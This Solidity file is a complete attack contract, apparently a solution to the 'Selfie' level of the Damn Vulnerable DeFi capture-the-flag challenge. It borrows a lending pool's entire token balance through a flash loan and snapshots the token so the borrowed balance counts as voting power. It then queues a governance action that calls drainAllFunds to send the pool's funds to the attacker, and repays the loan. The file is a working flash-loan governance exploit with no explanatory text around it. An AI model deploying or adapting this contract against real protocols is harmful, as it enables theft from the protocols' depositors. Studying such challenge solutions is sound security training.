// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "@openzeppelin/contracts/access/Ownable.sol";
import "@openzeppelin/contracts/utils/Address.sol";
import "@openzeppelin/contracts/utils/math/SafeMath.sol";
import "@openzeppelin/contracts/token/ERC20/extensions/ERC20Snapshot.sol";

interface ISelfiePool {

    function drainAllFunds(
        address receiver
    ) external;

    function flashLoan(
        uint256 borrowAmount
    ) external;
}

interface ISimpleGovernance {
    function queueAction(
        address receiver, 
        bytes calldata data, 
        uint256 weiAmount
    ) external returns (uint256);

    function executeAction(
        uint256 actionId
    ) external;
}

interface IDamnValuableTokenSnapshot {
    function snapshot() external;

    function transfer(address, uint256) external;

    function balanceOf(address account) external returns (uint256);
}


contract SelfieAttackContract is Ownable {

    ISelfiePool loanPool;
    ISimpleGovernance governance;
    IDamnValuableTokenSnapshot token;
    uint256 borrowAmount;
    uint256 public actionId;
    address attackerEOA;

    constructor() {}

    function attack(
        ISelfiePool _loanPool,
        ISimpleGovernance _governance,
        IDamnValuableTokenSnapshot _token,
        uint256 _borrowAmount
    ) public onlyOwner {

        loanPool = _loanPool;
        governance = _governance;
        token = _token;
        borrowAmount = _borrowAmount;
        attackerEOA = msg.sender;

        // call flash loan for full available balance
        loanPool.flashLoan(token.balanceOf(address(loanPool)));


    }

    // function called by SelfiePool::flashLoan
    function receiveTokens(
        address,
        uint256 amount
    ) external {
        
        // take a snapshot of token balance after receiving flash loan
        token.snapshot();

        // queue fund draining action via governance
        bytes memory drainAllFundsPayload =
            abi.encodeWithSignature("drainAllFunds(address)", attackerEOA);

        // queue action for governance
        actionId = governance.queueAction(
            address(loanPool),
            drainAllFundsPayload,
            0
        );

        // repay flash loan
        token.transfer(msg.sender, amount);
    }

    // be able to receive flash loan funds
    receive() external payable {}

    function getActionId() external view returns(uint256) {
        return actionId;
    }

}